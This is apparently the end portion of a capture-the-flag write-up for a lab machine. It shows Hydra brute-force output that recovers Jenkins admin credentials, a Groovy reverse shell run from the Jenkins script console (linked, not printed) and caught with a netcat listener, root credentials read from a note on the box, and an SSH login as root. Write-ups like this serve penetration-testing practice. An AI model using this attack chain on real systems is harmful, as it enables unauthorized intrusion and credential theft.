[ATTEMPT] target localhost - login "admin" - pass "elizabeth" - 61 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "hottie" - 62 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "tinkerbell" - 63 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "charlie" - 64 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "samantha" - 65 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "barbie" - 66 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "chelsea" - 67 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lovers" - 68 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "teamo" - 69 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jasmine" - 70 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "brandon" - 71 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "666666" - 72 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "shadow" - 73 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "melissa" - 74 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "eminem" - 75 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "matthew" - 76 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "robert" - 77 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "danielle" - 78 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "forever" - 79 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "family" - 80 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jonathan" - 81 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "987654321" - 82 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "computer" - 83 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "whatever" - 84 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "dragon" - 85 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "vanessa" - 86 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "cookie" - 87 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "naruto" - 88 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "summer" - 89 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sweety" - 90 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "spongebob" - 91 of 28688798 [child 6] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "joseph" - 92 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "junior" - 93 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "softball" - 94 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "taylor" - 95 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "yellow" - 96 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "daniela" - 97 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "lauren" - 98 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "mickey" - 99 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "princesa" - 100 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "alexandra" - 101 of 28688798 [child 1] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "alexis" - 102 of 28688798 [child 10] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jesus" - 103 of 28688798 [child 8] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "estrella" - 104 of 28688798 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "miguel" - 105 of 28688798 [child 0] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "william" - 106 of 28688798 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "thomas" - 107 of 28688798 [child 5] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "beautiful" - 108 of 28688798 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "mylove" - 109 of 28688798 [child 11] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "angela" - 110 of 28688798 [child 12] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "poohbear" - 111 of 28688798 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "patrick" - 112 of 28688798 [child 13] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "iloveme" - 113 of 28688798 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sakura" - 114 of 28688798 [child 3] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "adrian" - 115 of 28688798 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "alexander" - 116 of 28688798 [child 1] (0/0)
[8080][http-post-form] host: localhost   login: admin   password: spongebob
```

> Creds Found : Username - admin; Password - spongebob

Login to jenkins console - Login Sucess! :) 

- Under Manage Jenkins tab --> Script console [opens groovy script console]
  
    ![](/home/edith/pwn/vuln_machines/internal/002.png)

- Use the groovy reverse shell script for linux [found here](https://gist.githubusercontent.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7/raw/ed2e1c98ec36326cb629101a9059645127196eb2/GroovyScripts.md)

- Start the netcat listnerOn checking files present in user directory, found jenkins is running on **172.17.0.2:8080** and on checking the ip address found **docker0** has the IP range **172.17.0.1/16**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ nc -nlp 4444
listening on [any] 4444 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.37.97] 59174

whoami
jenkins

ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

cd opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Login to root user via ssh

```
──(edith🛸HackBox)-[~/pwn/vuln_machines/internal]
└─$ ssh root@internal.thm
root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May 22 14:49:33 UTC 2024

  System load:  0.0               Processes:              112
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 40%               IP address for eth0:    10.10.37.97
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# ls
root.txt  snap
```
